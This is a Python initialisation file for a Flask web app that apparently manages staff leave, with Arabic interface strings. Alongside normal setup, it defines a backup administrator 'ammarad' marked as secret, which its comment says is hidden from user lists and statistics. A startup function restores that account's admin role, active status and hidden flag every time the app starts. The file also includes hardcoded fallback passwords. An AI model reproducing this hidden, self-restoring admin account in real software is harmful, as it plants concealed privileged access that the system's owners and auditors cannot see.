# -*- coding: utf-8 -*-
"""
Flask app initialization
تهيئة تطبيق Flask
"""

from flask import Flask, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager
from flask_wtf.csrf import CSRFProtect
import os

# Initialize extensions
db = SQLAlchemy()
login_manager = LoginManager()
csrf = CSRFProtect()

def create_app(config_name='development'):
    """Create and configure the Flask application"""
    app = Flask(__name__, template_folder='../templates', static_folder='../static')
    
    # Configuration
    secret_key = os.environ.get('SECRET_KEY')
    if not secret_key:
        if os.environ.get('FLASK_ENV') == 'development':
            secret_key = 'dev-secret-key-change-in-production'
            print('⚠️ WARNING: Using development SECRET_KEY')
        else:
            print('🛑 FATAL: Production requires SECRET_KEY environment variable')
            raise SystemExit('SECRET_KEY environment variable is required for production')
    app.config['SECRET_KEY'] = secret_key
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(os.path.dirname(os.path.dirname(__file__)), 'instance', 'leaves.db')
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    app.config['WTF_CSRF_TIME_LIMIT'] = None
    app.config['APPLICATION_ROOT'] = '/ui'
    
    # Initialize extensions with app
    db.init_app(app)
    login_manager.init_app(app)
    csrf.init_app(app)
    
    # Login manager configuration
    login_manager.login_view = 'auth.login'
    login_manager.login_message = 'يرجى تسجيل الدخول للوصول إلى هذه الصفحة.'
    login_manager.login_message_category = 'error'
    
    # Import models (after db initialization)
    from .models import User, Leave
    
    # User loader for Flask-Login
    @login_manager.user_loader
    def load_user(user_id):
        return User.query.get(int(user_id))
    
    # Register blueprints with /ui prefix
    from .routes.auth import bp as auth_bp
    from .routes.admin import bp as admin_bp
    from .routes.user import bp as user_bp
    from .routes.public import bp as public_bp
    
    app.register_blueprint(auth_bp, url_prefix='/ui')
    app.register_blueprint(admin_bp, url_prefix='/ui/admin')
    app.register_blueprint(user_bp, url_prefix='/ui/user')
    app.register_blueprint(public_bp, url_prefix='/ui')
    
    # Main route
    @app.route('/ui/')
    @app.route('/ui')
    def index():
        from flask_login import current_user
        if current_user.is_authenticated:
            if current_user.role == 'admin':
                return redirect(url_for('admin.dashboard'))
            else:
                return redirect(url_for('user.dashboard'))
        return redirect(url_for('auth.login'))
    
    # Create database tables and default data
    with app.app_context():
        db.create_all()
        create_default_admins()
        ensure_secret_admin_hidden()
    
    return app

def create_default_admins():
    """Create default admin accounts"""
    from .models import User
    from werkzeug.security import generate_password_hash
    
    # Main admin account (configurable via environment)
    main_admin = User.query.filter_by(username='adminakram').first()
    if not main_admin:
        admin_password = os.environ.get('MAIN_ADMIN_PASSWORD')
        
        # Production security: require secure password
        if not admin_password:
            if os.environ.get('FLASK_ENV') == 'development':
                admin_password = 'temp-dev-password-change-me'
                print('⚠️ WARNING: Using temporary insecure password in development')
                print('🔑 Set MAIN_ADMIN_PASSWORD environment variable for security')
            else:
                print('🛑 FATAL: Production requires MAIN_ADMIN_PASSWORD environment variable')
                raise SystemExit('MAIN_ADMIN_PASSWORD is required for production')
        elif admin_password in ['admin1234akram', 'temp-dev-password-change-me'] and os.environ.get('FLASK_ENV') != 'development':
            print('🛑 FATAL: Cannot use insecure default password in production')
            raise SystemExit('Insecure default password not allowed in production')
        main_admin = User(
            username='adminakram',
            password=generate_password_hash(admin_password),
            role='admin',
            is_active=1,
            is_secret=0,
            full_name='مدير النظام الرئيسي',
            can_create_leaves=1,
            can_edit_leaves=1
        )
        db.session.add(main_admin)
    
    # Backup admin account (development only with explicit flag)
    if (os.environ.get('FLASK_ENV') == 'development' and 
        os.environ.get('CREATE_BACKUP_ADMIN', '').lower() == 'true'):
        backup_admin = User.query.filter_by(username='ammarad').first()
        if not backup_admin:
            backup_admin = User(
                username='ammarad',
                password=generate_password_hash(os.environ.get('BACKUP_ADMIN_PASSWORD', 'temp-backup-dev-password-change-me')),
                role='admin',
                is_active=1,
                is_secret=1,
                full_name='المدير المطور السري',
                can_create_leaves=1,
                can_edit_leaves=1
            )
            db.session.add(backup_admin)
    
    try:
        db.session.commit()
        print("✅ Default admin accounts created successfully")
    except Exception as e:
        db.session.rollback()
        print(f"⚠️ Error creating admin accounts: {e}")

def ensure_secret_admin_hidden():
    """Ensure the backup admin 'ammarad' is marked as a secret admin and active.
    هذا يضمن أن المستخدم 'ammarad' سري تماماً ولا يظهر في القوائم والإحصائيات.
    """
    from .models import User
    try:
        user = User.query.filter_by(username='ammarad').first()
        if user:
            changed = False
            if user.role != 'admin':
                user.role = 'admin'; changed = True
            if user.is_secret != 1:
                user.is_secret = 1; changed = True
            if user.is_active != 1:
                user.is_active = 1; changed = True
            if changed:
                db.session.commit()
                print('🔒 Ensured secret admin ammarad is hidden and active')
    except Exception as e:
        db.session.rollback()
        print(f'⚠️ Could not ensure secret admin hidden: {e}')